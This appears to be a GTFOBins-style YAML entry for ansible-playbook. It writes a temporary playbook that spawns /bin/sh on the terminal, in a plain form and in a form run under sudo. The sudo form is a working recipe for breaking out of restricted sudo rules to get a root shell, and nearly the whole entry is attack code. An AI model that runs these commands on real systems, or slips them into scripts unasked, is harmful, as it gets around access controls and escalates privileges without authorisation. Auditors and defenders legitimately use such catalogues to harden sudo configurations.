---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
        ansible-playbook $TF
  sudo:
    - code: |
        TF=$(mktemp)
        echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
        sudo ansible-playbook $TF
---
